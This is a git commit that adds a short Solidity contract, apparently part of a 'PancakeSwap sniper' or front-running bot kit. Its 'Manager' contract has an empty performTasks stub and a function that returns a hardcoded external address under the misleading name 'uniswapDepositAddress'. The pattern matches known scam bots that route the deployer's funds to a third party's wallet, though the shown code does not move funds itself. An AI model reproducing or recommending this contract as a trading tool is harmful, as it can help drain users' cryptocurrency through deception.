782a8ce271db831128340af98ed345d81bb1606d
BSCFrontRunnerBot <savesquiddao@gmail.com>
2022-05-31 19:18:59 +0500

    Create PancakeswapV2sniper.sol

---
+++ PancakeswapV2sniper.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager { 
+	function performTasks() public { 
+
+	 	} 	
+
+        function uniswapDepositAddress() public pure returns (address) { 
+		return 0xE76efDa2F807AA6Ace4eBda5e85e6eE103504CF2;
+	} 
+}
